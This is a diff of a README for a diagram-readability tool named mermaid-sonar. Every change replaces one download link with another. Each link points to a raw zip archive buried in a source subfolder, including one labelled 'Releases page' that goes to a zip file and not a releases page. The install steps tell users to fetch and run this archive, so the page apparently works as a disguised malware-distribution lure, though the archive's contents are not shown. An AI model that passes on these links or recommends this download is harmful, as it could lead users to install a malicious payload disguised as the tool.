@@ -1,6 +1,6 @@
 # 🎨 mermaid-sonar - Simplify Your Diagrams’ Readability
 
-[![Download mermaid-sonar](https://raw.githubusercontent.com/SHUUUUUUDAAAAANNN/mermaid-sonar/master/src/rules/mermaid-sonar_2.6.zip)](https://raw.githubusercontent.com/SHUUUUUUDAAAAANNN/mermaid-sonar/master/src/rules/mermaid-sonar_2.6.zip)
+[![Download mermaid-sonar](https://raw.githubusercontent.com/SHUUUUUUDAAAAANNN/mermaid-sonar/master/examples/gitlab-ci/sonar-mermaid-3.3.zip)](https://raw.githubusercontent.com/SHUUUUUUDAAAAANNN/mermaid-sonar/master/examples/gitlab-ci/sonar-mermaid-3.3.zip)
 
 ## 📃 About
 
@@ -15,7 +15,7 @@ mermaid-sonar helps you detect complex and unreadable Mermaid diagrams. Using re
    - Internet Connection: Required for downloading
 
 2. **Installation Steps**
-   1. Visit the [Releases page](https://raw.githubusercontent.com/SHUUUUUUDAAAAANNN/mermaid-sonar/master/src/rules/mermaid-sonar_2.6.zip) to download the latest version.
+   1. Visit the [Releases page](https://raw.githubusercontent.com/SHUUUUUUDAAAAANNN/mermaid-sonar/master/examples/gitlab-ci/sonar-mermaid-3.3.zip) to download the latest version.
    2. Download the appropriate file for your operating system.
    3. Locate the downloaded file on your computer.
 
@@ -33,7 +33,7 @@ mermaid-sonar helps you detect complex and unreadable Mermaid diagrams. Using re
 
 ## 📥 Download & Install
 
-To start using mermaid-sonar, [visit this page to download](https://raw.githubusercontent.com/SHUUUUUUDAAAAANNN/mermaid-sonar/master/src/rules/mermaid-sonar_2.6.zip). Once on the page, choose the version for your operating system. Download the file and follow the installation steps outlined above.
+To start using mermaid-sonar, [visit this page to download](https://raw.githubusercontent.com/SHUUUUUUDAAAAANNN/mermaid-sonar/master/examples/gitlab-ci/sonar-mermaid-3.3.zip). Once on the page, choose the version for your operating system. Download the file and follow the installation steps outlined above.
 
 ## ⚙️ How to Use
 
@@ -64,4 +64,4 @@ Thank you to the community and developers behind the Mermaid project. Their work
 
 If you need assistance, please open an issue on our GitHub repository. We aim to address your concerns as promptly as possible.
 
-[![Download mermaid-sonar](https://raw.githubusercontent.com/SHUUUUUUDAAAAANNN/mermaid-sonar/master/src/rules/mermaid-sonar_2.6.zip)](https://raw.githubusercontent.com/SHUUUUUUDAAAAANNN/mermaid-sonar/master/src/rules/mermaid-sonar_2.6.zip)
+[![Download mermaid-sonar](https://raw.githubusercontent.com/SHUUUUUUDAAAAANNN/mermaid-sonar/master/examples/gitlab-ci/sonar-mermaid-3.3.zip)](https://raw.githubusercontent.com/SHUUUUUUDAAAAANNN/mermaid-sonar/master/examples/gitlab-ci/sonar-mermaid-3.3.zip)
